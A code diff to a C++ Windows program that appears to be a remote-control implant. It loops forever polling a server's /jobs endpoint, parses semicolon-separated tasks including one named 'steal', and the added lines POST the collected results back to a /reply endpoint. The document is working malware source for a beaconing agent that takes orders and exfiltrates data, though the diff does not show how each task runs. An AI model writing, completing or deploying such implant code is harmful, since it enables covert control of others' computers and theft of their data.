@@ -82,20 +82,23 @@ int wmain()
         string taskStr, strTemp, taskHolder, powershellCommand, output, finalOutput;
         size_t semiColonIndex, numOfTasks, start_index;
         while(iamImmortal){
-            Sleep(number);
+            Sleep(10000);
             //request jobs
             taskStr = client->makeHttpRequest(L"POST", L"/jobs", tls, &result);
-            if(result && taskStr.size() > 4){
+            cout << "Tasks: " << taskStr.c_str() << endl;
+            if(result && taskStr.size()){
                 printf("Unable to get tasks\n");
             }else{
                 //parse the tasks
-                strTemp = taskStr.substr(2, taskStr.size()-4);
+                strTemp = taskStr.substr(0, taskStr.size()-2);
                 cout << strTemp.c_str() << endl;
                 semiColonIndex = 0;
                 numOfTasks = 0;
-                start_index = 0;
+                start_index = 2;
                 semiColonIndex = strTemp.find(";", semiColonIndex);
                 finalOutput = "";
+
+                //do the tasks
                 while(semiColonIndex != -1){
                     taskHolder = strTemp.substr(start_index, semiColonIndex-start_index);
                     if(!taskHolder.compare("steal")){
@@ -114,7 +117,15 @@ int wmain()
                     semiColonIndex = strTemp.find(";", semiColonIndex + 1);
                     numOfTasks++;
                 }
-                cout << finalOutput.c_str() << endl;
+                if(numOfTasks != 0){
+                    cout << finalOutput.c_str() << endl;
+                    client->requestData = finalOutput.c_str();
+                    client->data_size = finalOutput.size();
+                    client->makeHttpRequest(L"POST", L"/reply", tls, &result);
+                    if(result){
+                        printf("Failed to send back response, oops\n");
+                    }
+                }
             }
         }
 
